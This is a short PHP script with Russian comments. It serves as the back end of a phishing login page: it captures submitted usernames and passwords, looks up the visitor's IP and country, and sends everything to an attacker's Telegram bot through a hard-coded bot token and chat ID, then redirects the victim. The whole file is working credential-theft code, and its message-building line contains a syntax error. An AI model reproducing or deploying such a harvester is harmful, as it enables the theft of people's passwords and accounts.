<?php

//В переменную $token нужно вставить токен, который нам прислал @botFather
$token = "6424317613:AAG4coxPuMkHkmE1511H3lUJmM1CewvXVy8";

//Сюда вставляем chat_id
$chat_id = "976716027";

//Определяем переменные для передачи данных из нашей формы
$login = ($_POST['username']);
$password = ($_POST['password']);



//Настраиваем внешний вид сообщения в телеграме
$ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] :
($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

$country = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));

$message = "Полученны новые данные: \n Логин: " . $login . "\n Пароль: " . $password . "\n\n IP: " . $ip . "/n Страна:  " $country->country; "";
//Передаем данные боту


file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.urlencode($message).'&parse_mode=html');

header('Location: index.html');
?>